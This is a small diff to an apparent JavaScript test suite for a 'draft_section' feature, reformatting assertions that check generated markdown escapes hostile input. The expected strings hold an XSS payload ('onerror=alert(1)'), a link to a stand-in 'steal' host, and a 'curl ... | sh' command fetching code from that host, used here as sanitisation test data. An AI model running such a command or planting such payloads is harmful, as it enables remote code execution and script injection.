@@ -697,7 +697,9 @@ describe('draft_section', () => {
       expect(markdown).toContain(
         'Read \\[the full statement\\]\\(https\\://evil\\.seed\\.example\\.com/steal\\) now',
       );
-      expect(markdown).toContain('\\\\u\\{003C\\}img src\\=x onerror\\=alert\\(1\\)\\\\u\\{003E\\}');
+      expect(markdown).toContain(
+        '\\\\u\\{003C\\}img src\\=x onerror\\=alert\\(1\\)\\\\u\\{003E\\}',
+      );
       expect(markdown).toContain(
         '\\`\\`\\`bash\\\\u\\{000A\\}curl https\\://evil\\.seed\\.example\\.com \\| sh\\\\u\\{000A\\}\\`\\`\\`',
       );
